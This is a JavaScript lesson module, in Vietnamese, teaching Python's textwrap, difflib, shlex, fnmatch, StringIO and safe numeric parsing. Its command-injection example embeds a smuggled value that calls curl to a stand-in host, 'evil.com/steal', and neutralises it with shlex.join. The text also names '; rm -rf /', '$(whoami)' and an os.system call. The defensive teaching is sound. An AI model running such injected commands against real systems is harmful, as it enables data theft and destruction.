export default {
  id: 'p5-03',
  partId: 'part-5',
  partTitle: 'Phần 5 – Xử lý văn bản nâng cao (Nâng cao)',
  number: '5.3',
  title: 'Hệ sinh thái Văn bản Chuẩn & Chuyển đổi Chuỗi ↔ Số An toàn',
  subtitle: 'Làm chủ textwrap, difflib, shlex, fnmatch, io.StringIO và kỹ thuật parse int, float, Decimal, ast.literal_eval()',
  level: 'Nâng cao',
  duration: '45 phút',
  isNew314: false,
  interactiveWidget: null,
  objectives: [
    'Định dạng khối văn bản chuyên nghiệp với textwrap (dedent, indent, fill, shorten) và sử dụng bộ đệm trong bộ nhớ io.StringIO.',
    'So sánh sự khác biệt văn bản, tìm từ gần giống với difflib (unified_diff, get_close_matches, SequenceMatcher).',
    'Tách/ghép dòng lệnh an toàn chống Command Injection với shlex (split, join, quote) và lọc tên file với fnmatch.',
    'Thực hiện chuyển đổi chuỗi ↔ số chính xác và an toàn với int(s, base), float(s), decimal.Decimal(s) và ast.literal_eval().'
  ],
  intuition: {
    title: 'Hộp dụng cụ Thụy Sĩ có sẵn trong Kho báu Thư viện chuẩn',
    metaphor: 'Nhiều lập trình viên mất hàng giờ tự viết hàm căn lề văn bản, tự viết thuật toán quy hoạch động tìm từ gõ sai chính tả, hay tự dùng str.split() để tách lệnh terminal rồi dính lỗ hổng bảo mật — mà không biết rằng Python đã trang bị sẵn một "Hộp dao đa năng Thụy Sĩ" cực kỳ tinh xảo ngay trong thư viện chuẩn: textwrap để dàn trang, difflib để so khớp mờ, shlex để khóa chặt an toàn dòng lệnh, StringIO để làm file ảo trên RAM, cùng bộ tứ Decimal + literal_eval để tính tiền và đọc dữ liệu không bao giờ sai một xu!',
    visualHtml: `
      <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:12px;font-family:monospace;font-size:12.5px;padding:14px;background:rgba(15,23,42,0.6);border:1px solid #334155;border-radius:12px;">
        <div style="background:#1e293b;padding:12px;border-radius:8px;border-left:4px solid #38bdf8;">
          <div style="color:#38bdf8;font-weight:bold;margin-bottom:6px;">Ngũ hổ tướng Xử lý văn bản</div>
          <div style="color:#e2e8f0;line-height:1.6;">
            • <b>textwrap</b>: <code>dedent, indent, fill, shorten</code><br/>
            • <b>difflib</b>: <code>get_close_matches, unified_diff</code><br/>
            • <b>shlex</b>: <code>split, join, quote</code> (An toàn Shell)<br/>
            • <b>fnmatch</b>: <code>fnmatch, fnmatchcase, filter</code><br/>
            • <b>io.StringIO</b>: Luồng file văn bản tốc độ cao trong RAM
          </div>
        </div>
        <div style="background:#1e293b;padding:12px;border-radius:8px;border-left:4px solid #f59e0b;">
          <div style="color:#fbbf24;font-weight:bold;margin-bottom:6px;">Chuỗi ↔ Số &amp; Đánh giá An toàn</div>
          <div style="color:#e2e8f0;line-height:1.6;">
            • <b>int(s, base)</b>: Hệ 2..36, <code>base=0</code>, hỗ trợ <code>1_000</code><br/>
            • <b>float(s)</b>: Hỗ trợ <code>'inf'</code>, <code>'nan'</code>, <code>1.5e-3</code><br/>
            • <b>Decimal('0.1')</b>: Truyền <code>str</code> để tránh sai số IEEE 754<br/>
            • <b>ast.literal_eval(s)</b>: Thay thế <code>eval()</code> an toàn 100%
          </div>
        </div>
      </div>
    `
  },
  sections: [
    {
      id: 'sec-1',
      title: 'Lớp 1: Định dạng văn bản với textwrap, Bộ đệm io.StringIO và So khớp difflib',
      badge: 'textwrap · difflib · StringIO',
      content: `
        <p>Ba module đầu tiên giúp bạn giải quyết gọn gàng các bài toán trình bày, ghép luồng văn bản và tìm kiếm xấp xỉ:</p>
        <ul>
          <li><strong><code>textwrap</code> — Dàn trang và căn chỉnh khối văn bản:</strong>
            <ul>
              <li><code>textwrap.dedent(text)</code>: Xóa phần khoảng trắng thụt lề chung ở đầu mỗi dòng — cứu tinh khi viết chuỗi nhiều dòng <code>"""..."""</code> nằm sâu bên trong hàm hoặc class.</li>
              <li><code>textwrap.indent(text, prefix)</code>: Thêm tiền tố (ví dụ <code>"  | "</code>) vào đầu mọi dòng không rỗng.</li>
              <li><code>textwrap.fill(text, width=70)</code> và <code>wrap()</code>: Tự động ngắt dòng theo độ rộng cột mà không làm đứt giữa từ.</li>
              <li><code>textwrap.shorten(text, width, placeholder="...")</code>: Gom khoảng trắng thừa và cắt ngắn văn bản vừa khít <code>width</code> ký tự (kể cả phần <code>placeholder</code>).</li>
            </ul>
          </li>
          <li><strong><code>difflib</code> — So sánh sự khác biệt và Tìm kiếm mờ (Fuzzy Matching):</strong>
            <ul>
              <li><code>difflib.get_close_matches(word, possibilities, n=3, cutoff=0.6)</code>: Tìm các từ gần giống nhất để gợi ý khi người dùng gõ sai tên lệnh hoặc từ khóa.</li>
              <li><code>difflib.SequenceMatcher(None, a, b).ratio()</code>: Tính điểm tương đồng từ <code>0.0</code> đến <code>1.0</code> giữa hai chuỗi.</li>
              <li><code>difflib.unified_diff(lines_a, lines_b, fromfile=..., tofile=..., lineterm="")</code>: Xuất bản vá so sánh dòng chuẩn Git diff (<code>---</code>, <code>+++</code>, <code>@@</code>).</li>
            </ul>
          </li>
          <li><strong><code>io.StringIO</code> — File văn bản ảo trong bộ nhớ RAM:</strong> Cung cấp giao diện đọc/ghi giống hệt đối tượng file trả về từ <code>open()</code> (<code>.write()</code>, <code>print(..., file=buf)</code>, <code>.seek(0)</code>, <code>.getvalue()</code>). Dùng khi cần truyền "file" vào các thư viện như <code>csv.writer</code>, <code>json.dump</code> mà không muốn tạo file tạm trên ổ cứng.</li>
        </ul>
      `,
      codeExamples: [
        {
          title: 'Kết hợp textwrap, difflib và io.StringIO trong thực tế',
          code: `import difflib
import io
import textwrap

# 1. textwrap: dedent, shorten và indent
raw_doc = """
    Xin chào học viên Python 3.14!
    Đây là khóa học chuyên sâu về xử lý chuỗi và văn bản.
""".strip("\\n")
clean_doc = textwrap.dedent(raw_doc)
print("Shorten:", textwrap.shorten(clean_doc, width=38, placeholder=" [...]"))
print("Indent :\\n" + textwrap.indent(clean_doc, prefix="  > "))

# 2. difflib: Gợi ý lệnh CLI viết sai và xuất Unified Diff
commands = ["install", "uninstall", "update", "upgrade", "list", "search"]
typo = "instal"
print(f"Gõ nhầm {typo!r} -> Ý bạn là:", difflib.get_close_matches(typo, commands, n=2, cutoff=0.7))

diff = difflib.unified_diff(
    ["버전: 3.13", "status: beta"],
    ["버전: 3.14", "status: stable"],
    fromfile="old.cfg", tofile="new.cfg", lineterm=""
)
print("Unified Diff:\\n" + "\\n".join(diff))

# 3. io.StringIO: Ghi báo cáo vào file ảo trong RAM bằng print(..., file=buf)
buf = io.StringIO()
for i in range(1, 4):
    print(f"Dòng #{i}: OK", file=buf)
print("Nội dung StringIO:", repr(buf.getvalue()))`,
          output: `Shorten: Xin chào học viên Python 3.14! [...]
Indent :
  > Xin chào học viên Python 3.14!
  > Đây là khóa học chuyên sâu về xử lý chuỗi và văn bản.
Gõ nhầm 'instal' -> Ý bạn là: ['install']
Unified Diff:
--- old.cfg
+++ new.cfg
@@ -1,2 +1,2 @@
-버전: 3.13
-status: beta
+버전: 3.14
+status: stable
Nội dung StringIO: 'Dòng #1: OK\\nDòng #2: OK\\nDòng #3: OK\\n'`,
          annotations: [
            { line: 10, text: 'textwrap.dedent() xóa đúng 4 dấu cách thụt đầu dòng chung của cả khối văn bản.' },
            { line: 17, text: 'get_close_matches() sử dụng thuật toán Ratcliff/Obershelp bên trong SequenceMatcher để tìm ứng viên giống nhất.' },
            { line: 27, text: 'io.StringIO cho phép tái sử dụng mọi hàm nhận đối tượng file (như print(..., file=buf) hay csv.writer(buf)) ngay trên RAM.' }
          ]
        }
      ]
    },
    {
      id: 'sec-2',
      title: 'Lớp 2: Phân tích lệnh Shell với shlex và Khớp tên file với fnmatch',
      badge: 'shlex · fnmatch',
      content: `
        <p>Khi làm việc với công cụ dòng lệnh (CLI) và đường dẫn tập tin, tuyệt đối không dùng <code>str.split()</code> đơn thuần:</p>
        <ul>
          <li><strong><code>shlex</code> (Lexical analysis of shell-style syntaxes):</strong>
            <ul>
              <li><code>shlex.split(cmd_str)</code>: Tách chuỗi lệnh theo đúng quy tắc quoting của Unix Bourne shell — giữ nguyên cụm có khoảng trắng nằm trong dấu nháy kép/đơn như <code>--file "Báo cáo năm 2026.pdf"</code> thành một phần tử duy nhất!</li>
              <li><code>shlex.quote(arg)</code>: Bọc chuỗi đầu vào của người dùng trong cặp dấu nháy an toàn, vô hiệu hóa hoàn toàn mọi ký tự tấn công <strong>Command Injection</strong> như <code>; rm -rf /</code> hay <code>$(whoami)</code>.</li>
              <li><code>shlex.join(tokens)</code>: Ngược lại với <code>split()</code>, ghép danh sách các tham số thành một chuỗi lệnh shell đã được escape chuẩn xác.</li>
            </ul>
          </li>
          <li><strong><code>fnmatch</code> (Unix filename pattern matching):</strong> So khớp chuỗi theo cú pháp Wildcard quen thuộc của Shell (<code>*</code> khớp mọi chuỗi, <code>?</code> khớp 1 ký tự, <code>[seq]</code> khớp ký tự trong tập, <code>[!seq]</code> phủ định) — đơn giản và trực quan hơn Regex khi lọc tên file:
            <ul>
              <li><code>fnmatch.fnmatch(name, pat)</code>: So khớp theo độ nhạy hoa/thường của hệ điều hành hiện tại (không phân biệt hoa/thường trên Windows, có phân biệt trên Linux).</li>
              <li><code>fnmatch.fnmatchcase(name, pat)</code>: Luôn phân biệt chữ hoa/thường nhất quán trên mọi hệ điều hành.</li>
              <li><code>fnmatch.filter(names, pat)</code>: Lọc nhanh một danh sách tên file khớp với mẫu <code>pat</code>.</li>
            </ul>
          </li>
        </ul>
      `,
      codeExamples: [
        {
          title: 'Tách/ghép lệnh chống Command Injection với shlex và lọc file với fnmatch',
          code: `import fnmatch
import shlex

# 1. shlex.split giữ nguyên chuỗi có khoảng trắng trong ngoặc kép
cmd = 'python backup.py --src "D:/Tài liệu/Dự án 2026" --compress'
print("str.split() bị sai :", cmd.split())
print("shlex.split() chuẩn:", shlex.split(cmd))

# 2. Chống Command Injection bằng shlex.quote và shlex.join
untrusted_filename = "baocao.txt; curl http://evil.com/steal"
safe_cmd = shlex.join(["cat", untrusted_filename])
print("Lệnh đã khóa an toàn:", safe_cmd)

# 3. Lọc danh sách file bằng fnmatch.filter và fnmatchcase
files = ["p4-01.js", "p4-02.js", "P4-03.JS", "app.js", "README.md"]
print("fnmatch.filter('p[45]-*.js'):", fnmatch.filter(files, "p[45]-*.js"))
print("fnmatchcase phân biệt hoa/thường:", [
    f for f in files if fnmatch.fnmatchcase(f, "p4-*.js")
])`,
          output: `str.split() bị sai : ['python', 'backup.py', '--src', '"D:/Tài', 'liệu/Dự', 'án', '2026"', '--compress']
shlex.split() chuẩn: ['python', 'backup.py', '--src', 'D:/Tài liệu/Dự án 2026', '--compress']
Lệnh đã khóa an toàn: cat 'baocao.txt; curl http://evil.com/steal'
fnmatch.filter('p[45]-*.js'): ['p4-01.js', 'p4-02.js', 'P4-03.JS']
fnmatchcase phân biệt hoa/thường: ['p4-01.js', 'p4-02.js']`,
          annotations: [
            { line: 7, text: 'shlex.split() hiểu ngữ pháp dấu ngoặc kép nên gom trọn vẹn "D:/Tài liệu/Dự án 2026" và tự bóc bỏ dấu ngoặc bao ngoài.' },
            { line: 11, text: 'shlex.join() tự động gọi shlex.quote() trên từng phần tử, biến toàn bộ chuỗi độc hại thành 1 tên file nguyên nghĩa vô hại.' },
            { line: 16, text: 'Trên Windows, fnmatch() mặc định không phân biệt hoa thường nên khớp cả "P4-03.JS"; dùng fnmatchcase() để ép phân biệt hoa thường.' }
          ]
        }
      ]
    },
    {
      id: 'sec-3',
      title: 'Lớp 3: Chuyển đổi Chuỗi ↔ Số (int, float, Decimal) và ast.literal_eval()',
      badge: 'Parse Số & Bảo mật',
      content: `
        <p>Chuyển đổi dữ liệu văn bản sang kiểu số và cấu trúc dữ liệu đòi hỏi sự chính xác tuyệt đối:</p>
        <ul>
          <li><strong><code>int(s, base=10)</code>:</strong>
            <ul>
              <li>Hỗ trợ khoảng trắng ở hai đầu và dấu gạch dưới phân tách hàng nghìn (ví dụ <code>int(" 1_500_000 ") == 1500000</code>).</li>
              <li>Tham số <code>base</code> nhận từ <code>2</code> đến <code>36</code>, hoặc <strong><code>base=0</code></strong> để Python tự động nhận diện tiền tố <code>"0xFF"</code> (hệ 16), <code>"0b1010"</code> (hệ 2), <code>"0o77"</code> (hệ 8).</li>
              <li>Lưu ý: <code>str.isdigit()</code> trả về <code>False</code> cho số âm <code>"-42"</code> nhưng lại trả về <code>True</code> cho chỉ số trên <code>"²"</code> (vốn làm <code>int("²")</code> ném <code>ValueError</code>!). Vì vậy, <strong>luôn dùng <code>try ... except ValueError</code></strong> khi chuyển chuỗi thành số.</li>
            </ul>
          </li>
          <li><strong><code>float(s)</code> vs <code>decimal.Decimal(s)</code>:</strong>
            <ul>
              <li><code>float(s)</code> chuyển chuỗi số thực IEEE 754 64-bit, chấp nhận cả ký hiệu khoa học <code>"1.25e-4"</code>, dấu <code>"_"</code>, và các hằng đặc biệt <strong><code>"inf"</code>, <code>"-inf"</code>, <code>"nan"</code></strong> (cẩn thận khi nhận input từ form thanh toán!).</li>
              <li>Do biểu diễn nhị phân IEEE 754, <code>0.1 + 0.2 == 0.30000000000000004</code>. Trong kế toán và tài chính, <strong>bắt buộc phải dùng <code>decimal.Decimal(s)</code> và truyền tham số là CHUỖI <code>str</code></strong> (<code>Decimal("0.1")</code>), tuyệt đối không truyền <code>float</code> (<code>Decimal(0.1)</code>)!</li>
            </ul>
          </li>
          <li><strong><code>ast.literal_eval(s)</code> thay cho <code>eval(s)</code>:</strong> Hàm <code>eval()</code> thực thi mã Python tùy ý nên nếu truyền chuỗi từ người dùng vào sẽ dẫn tới lỗ hổng chiếm quyền điều khiển máy chủ (RCE). Ngược lại, <code>ast.literal_eval()</code> chỉ phân tích cú pháp các hằng giá trị nguyên bản (<code>str, bytes, int, float, complex, list, tuple, dict, set, bool, None</code>) và từ chối mọi lời gọi hàm hay toán tử nguy hiểm!</li>
        </ul>
      `,
      codeExamples: [
        {
          title: 'Chuyển đổi int(s, base=0), bẫy float("inf"), Decimal(str) và ast.literal_eval()',
          code: `import ast
import math
from decimal import Decimal

# 1. int(s, base=0) tự đoán hệ cơ số và hỗ trợ dấu '_'
for raw in ["1_000_000", "0xFF", "0b1010", "0o77"]:
    print(f"int({raw!r:11}, base=0) -> {int(raw, base=0)}")

# 2. Sai số dấu phẩy động IEEE 754 vs Độ chính xác tuyệt đối của Decimal(str)
print("float  : 0.1 + 0.2 ==", 0.1 + 0.2)
print("Decimal: Decimal('0.1') + Decimal('0.2') ==", Decimal("0.1") + Decimal("0.2"))
print("Bẫy truyền float vào Decimal(0.1):", Decimal(0.1))

# 3. Cẩn thận với float('inf') và float('nan') khi validate số tiền!
val = float("inf")
print("float('inf') hợp lệ với math.isfinite()?", math.isfinite(val))

# 4. Đọc cấu trúc dữ liệu từ chuỗi an toàn tuyệt đối bằng ast.literal_eval()
config_str = "{'host': '127.0.0.1', 'ports': [8000, 8080], 'debug': False}"
parsed_cfg = ast.literal_eval(config_str)
print("ast.literal_eval ->", type(parsed_cfg).__name__, parsed_cfg["ports"])`,
          output: `int('1_000_000', base=0) -> 1000000
int('0xFF'     , base=0) -> 255
int('0b1010'   , base=0) -> 10
int('0o77'     , base=0) -> 63
float  : 0.1 + 0.2 == 0.30000000000000004
Decimal: Decimal('0.1') + Decimal('0.2') == 0.3
Bẫy truyền float vào Decimal(0.1): 0.1000000000000000055511151231257827021181583404541015625
float('inf') hợp lệ với math.isfinite()? False
ast.literal_eval -> dict [8000, 8080]`,
          annotations: [
            { line: 7, text: 'base=0 cho phép parse linh hoạt cả số thập phân thường lẫn các chuỗi có tiền tố 0x, 0b, 0o.' },
            { line: 12, text: 'Nếu viết Decimal(0.1) (không có ngoặc kép), số 0.1 đã bị mất chính xác thành float nhị phân TRƯỚC khi đưa vào Decimal!' },
            { line: 16, text: 'Khi dùng float(user_input) cho giá tiền, hãy luôn kiểm tra thêm math.isfinite(x) để chặn chuỗi "inf" và "nan".' },
            { line: 20, text: 'ast.literal_eval() parse chuỗi thành dict/list Python thực sự mà không bao giờ chạy lệnh hệ thống.' }
          ]
        }
      ]
    }
  ],
  callouts: {
    pitfalls: [
      {
        title: 'Lỗ hổng logic kinh điển: Người dùng nhập giá tiền là "inf" hoặc "nan"!',
        content: 'Hàm float("inf") và float("nan") hoàn toàn KHÔNG ném lỗi ValueError! Nếu bạn viết if float(amount) > balance:, thì float("inf") > balance là True, hoặc với float("nan") mọi phép so sánh <, >, == đều trả về False làm lọt qua các câu lệnh kiểm tra if amount < 0:! Hãy luôn dùng math.isfinite(val) hoặc Decimal.'
      },
      {
        title: 'Truyền số thực float vào Decimal(0.1) thay vì chuỗi Decimal("0.1")',
        content: 'Viết Decimal(0.1) lưu chính xác sai số nhị phân của 0.1 (0.10000000000000000555...). Luôn khởi tạo Decimal từ chuỗi văn bản str hoặc số nguyên int: Decimal("0.1").'
      },
      {
        title: 'Dùng str.isdigit() để kiểm tra trước khi gọi int()',
        content: '"²".isdigit() là True nhưng int("²") ném ValueError! Ngược lại "-15".isdigit() là False dù int("-15") hoàn toàn hợp lệ. Cách Pythonic duy nhất là dùng khối try: val = int(s) except ValueError:.'
      }
    ],
    tips: [
      {
        title: 'Giới hạn 4300 chữ số của int(s) để chống DoS (CVE-2020-10735)',
        content: 'Do thuật toán chuyển chuỗi thập phân sang số nguyên nhị phân có độ phức tạp O(n²), từ Python 3.11–3.14, truyền chuỗi dài trên 4300 chữ số vào int(s) sẽ ném ValueError. Nếu làm toán học số lớn hợp lệ, bạn có thể điều chỉnh bằng sys.set_int_max_str_digits().'
      },
      {
        title: 'Khi nào dùng io.StringIO thay vì "".join(list)?',
        content: 'Nếu bạn tự chủ động gom các mảnh chuỗi trong vòng lặp, list.append() + "".join() là nhanh nhất. Nhưng khi bạn làm việc với các hàm/thư viện yêu cầu đối tượng file-like (có phương thức .write() như csv.writer, xml.etree, logging), io.StringIO là lựa chọn hoàn hảo.'
      }
    ],
    deepDive: {
      title: 'Cách ast.literal_eval() bảo vệ bạn trước mã độc như thế nào?',
      content: `
        <p>Khi bạn gọi <code>ast.literal_eval(s)</code>, Python biên dịch chuỗi <code>s</code> thành một <strong>Cây cú pháp trừu tượng (Abstract Syntax Tree - AST)</strong> thông qua <code>ast.parse(s, mode='eval')</code>, nhưng <strong>không hề biên dịch sang Bytecode hay đưa vào máy ảo thực thi</strong>.</p>
        <p>Thay vào đó, một hàm duyệt cây đệ quy sẽ kiểm tra từng nút (node) trên cây AST: nó chỉ cho phép nút <code>Constant</code>, <code>List</code>, <code>Tuple</code>, <code>Dict</code>, <code>Set</code> và phép toán dấu âm/dương <code>UnaryOp(USub/UAdd)</code> trên hằng số. Ngay khi phát hiện nút <code>Call</code> (gọi hàm như <code>__import__('os').system(...)</code>) hoặc phép lũy thừa tiêu tốn bộ nhớ <code>2**100000000</code>, nó lập tức ném <code>ValueError: malformed node or string</code> trước khi bất kỳ lệnh nào kịp chạy!</p>
      `
    },
    newIn314: null
  },
  exercises: [
    {
      level: 'Dễ',
      title: 'Trợ lý gợi ý lệnh CLI thông minh với difflib và textwrap',
      problem: 'Viết hàm suggest_command(user_cmd: str, valid_cmds: list[str]) -> str. Nếu user_cmd nằm trong valid_cmds thì trả về "Thực thi: <user_cmd>". Ngược lại, dùng difflib.get_close_matches(..., cutoff=0.6) để tìm các lệnh gần giống và định dạng thông báo nhiều dòng đã được xóa thụt lề bằng textwrap.dedent().',
      hint: 'Dùng difflib.get_close_matches(user_cmd, valid_cmds, n=3, cutoff=0.6) và textwrap.dedent().strip().',
      solutionCode: `import difflib
import textwrap

def suggest_command(user_cmd: str, valid_cmds: list[str]) -> str:
    if user_cmd in valid_cmds:
        return f"Thực thi: {user_cmd}"
    matches = difflib.get_close_matches(user_cmd, valid_cmds, n=3, cutoff=0.6)
    hint_str = ", ".join(matches) if matches else "Không có gợi ý"
    msg = f"""
        Lệnh không hợp lệ: '{user_cmd}'
        Có phải ý bạn là : {hint_str}
    """
    return textwrap.dedent(msg).strip()

cmds = ["build", "bundle", "branch", "deploy", "test"]
print(suggest_command("buidl", cmds))`,
      solutionOutput: `Lệnh không hợp lệ: 'buidl'
Có phải ý bạn là : build, bundle`,
      explanation: 'get_close_matches("buidl", cmds) dễ dàng nhận ra lỗi đảo chữ cái "ld" -> "dl" trong "build", còn textwrap.dedent() giúp chuỗi f-string nhiều dòng trong hàm luôn căn sát lề trái sạch đẹp.'
    },
    {
      level: 'Vừa',
      title: 'Bộ tính tổng hóa đơn tài chính chính xác và an toàn với Decimal',
      problem: 'Cho một danh sách các chuỗi giá tiền nhập từ người dùng (có thể chứa khoảng trắng, dấu gạch dưới "_", chữ "inf", "nan", hoặc chuỗi rác). Viết hàm sum_valid_prices(raw_prices: list[str]) -> tuple[Decimal, list[str]] trả về (tổng_tiền_hợp_lệ_dương, danh_sách_giá_bị_lỗi). Một giá tiền hợp lệ phải chuyển được sang Decimal, là số hữu hạn (d.is_finite()) và > 0.',
      hint: 'Bắt ngoại lệ InvalidOperation từ module decimal, đồng thời kiểm tra d.is_finite() và d > 0.',
      solutionCode: `from decimal import Decimal, InvalidOperation

def sum_valid_prices(raw_prices: list[str]) -> tuple[Decimal, list[str]]:
    total = Decimal("0.00")
    invalid: list[str] = []
    for item in raw_prices:
        try:
            d = Decimal(item.strip())
            if not d.is_finite() or d <= 0:
                invalid.append(item)
            else:
                total += d
        except InvalidOperation:
            invalid.append(item)
    return total, invalid

inputs = ["0.1", "0.2", "1_500.50", "inf", "-20", "abc"]
total_amount, bad_items = sum_valid_prices(inputs)
print(f"Tổng cộng: {total_amount} | Bị loại: {bad_items}")`,
      solutionOutput: `Tổng cộng: 1500.80 | Bị loại: ['inf', '-20', 'abc']`,
      explanation: 'Khởi tạo Decimal từ chuỗi giữ độ chính xác thập phân tuyệt đối (0.1 + 0.2 + 1500.50 = 1500.80), và phương thức d.is_finite() chặn đứng các giá trị "inf", "-inf", "nan".'
    },
    {
      level: 'Khó',
      title: 'Chuyển đổi dòng lệnh sang cấu hình an toàn với shlex và ast.literal_eval',
      problem: 'Viết hàm parse_cli_overrides(cli_str: str) -> dict[str, object] nhận một chuỗi đối số dòng lệnh kiểu Unix (ví dụ: \'--retries 3 --ratios "[0.1, 0.2]" --debug True --name "Máy chủ 01"\'). Dùng shlex.split() để tách các cặp "--key value", sau đó thử dùng ast.literal_eval() để chuyển value thành kiểu Python tương ứng (int, list, bool...), nếu literal_eval ném ValueError/SyntaxError thì giữ nguyên kiểu str.',
      hint: 'Sau khi tách tokens = shlex.split(cli_str), duyệt theo bước nhảy 2 (i in range(0, len(tokens), 2)), bóc bỏ "--" ở key và thử ast.literal_eval(val_str).',
      solutionCode: `import ast
import shlex

def parse_cli_overrides(cli_str: str) -> dict[str, object]:
    tokens = shlex.split(cli_str)
    config: dict[str, object] = {}
    for i in range(0, len(tokens), 2):
        key = tokens[i].lstrip("-")
        raw_val = tokens[i + 1]
        try:
            config[key] = ast.literal_eval(raw_val)
        except (ValueError, SyntaxError):
            config[key] = raw_val
    return config

cmd_line = '--retries 3 --ratios "[0.1, 0.2]" --debug True --name "Máy chủ 01"'
parsed = parse_cli_overrides(cmd_line)
for k, v in parsed.items():
    print(f"{k:8} -> {v!r:14} (kiểu {type(v).__name__})")`,
      solutionOutput: `retries  -> 3              (kiểu int)
ratios   -> [0.1, 0.2]     (kiểu list)
debug    -> True           (kiểu bool)
name     -> 'Máy chủ 01'   (kiểu str)`,
      explanation: 'Sự kết hợp giữa shlex.split() và ast.literal_eval() giúp tách chuẩn xác các tham số có dấu cách, đồng thời tự động chuyển đổi số nguyên, danh sách, boolean một cách an toàn tuyệt đối mà không cần tới eval().'
    }
  ],
  quiz: [
    {
      question: 'Tại sao trong các ứng dụng tài chính, ta luôn phải viết Decimal("0.1") thay vì Decimal(0.1)?',
      options: [
        'Vì số 0.1 viết trực tiếp là kiểu float nhị phân IEEE 754 đã bị sai số làm tròn trước khi được truyền vào hàm tạo Decimal',
        'Vì Decimal() chỉ nhận đối số kiểu str và sẽ ném TypeError nếu truyền kiểu float',
        'Vì Decimal("0.1") tự động làm tròn đến 2 chữ số thập phân còn Decimal(0.1) thì không',
        'Vì truyền chuỗi giúp tốc độ tính toán nhanh gấp đôi trên CPU'
      ],
      correctIndex: 0,
      explanation: 'Trong hệ nhị phân IEEE 754, 0.1 không có biểu diễn hữu hạn mà lưu xấp xỉ thành 0.100000000000000005551115... Truyền chuỗi "0.1" giúp Decimal phân tích trực tiếp từng chữ số hệ thập phân.'
    },
    {
      question: 'Hàm nào dùng để tách chuỗi đối số dòng lệnh \'cmd --path "C:/Thư mục/file.txt"\' thành danh sách ["cmd", "--path", "C:/Thư mục/file.txt"]?',
      options: [
        'shlex.split()',
        'str.split()',
        'fnmatch.filter()',
        'textwrap.wrap()'
      ],
      correctIndex: 0,
      explanation: 'shlex.split() phân tích từ vựng theo quy tắc quoting của shell nên bảo toàn khoảng trắng nằm bên trong cặp dấu ngoặc kép.'
    },
    {
      question: 'Khi cần chuyển một chuỗi biểu diễn cấu trúc dữ liệu như "{\'a\': [1, 2, 3]}" từ nguồn không tin cậy thành đối tượng dict của Python, hàm nào an toàn nhất?',
      options: [
        'ast.literal_eval()',
        'eval()',
        'exec()',
        'shlex.quote()'
      ],
      correctIndex: 0,
      explanation: 'ast.literal_eval() chỉ chấp nhận các nút hằng số và cấu trúc dữ liệu cơ bản trên cây cú pháp AST, chặn hoàn toàn việc thực thi hàm hay lệnh hệ thống.'
    },
    {
      question: 'Biểu thức int("0xFF", base=0) trong Python 3.14 trả về kết quả gì?',
      options: [
        'Số nguyên 255 (vì base=0 cho phép tự động nhận diện hệ cơ số qua tiền tố 0x, 0b, 0o)',
        'Ném lỗi ValueError vì base không được phép bằng 0',
        'Số nguyên 0',
        'Chuỗi "255"'
      ],
      correctIndex: 0,
      explanation: 'Khi truyền base=0, hàm int() tự động đọc tiền tố trong chuỗi ("0x" -> hệ 16, "0b" -> hệ 2, "0o" -> hệ 8, hoặc không tiền tố -> hệ 10).'
    }
  ],
  summary: [
    'Sử dụng textwrap (dedent, indent, fill, shorten) để định dạng khối văn bản, difflib để so khớp mờ/xuất diff, và io.StringIO để thao tác bộ đệm văn bản như file trong RAM.',
    'Luôn dùng shlex.split(), shlex.join() và shlex.quote() khi xử lý chuỗi lệnh shell để bảo toàn khoảng trắng trong ngoặc kép và chống Command Injection.',
    'Sử dụng fnmatch / fnmatchcase khi cần lọc tên file bằng các mẫu wildcard đơn giản (*.py, data_[0-9].csv).',
    'Chuyển đổi chuỗi ↔ số an toàn bằng khối try...except ValueError, kiểm tra math.isfinite() với float, truyền chuỗi vào Decimal("0.1") cho bài toán tiền tệ, và dùng ast.literal_eval() thay cho eval().'
  ]
};
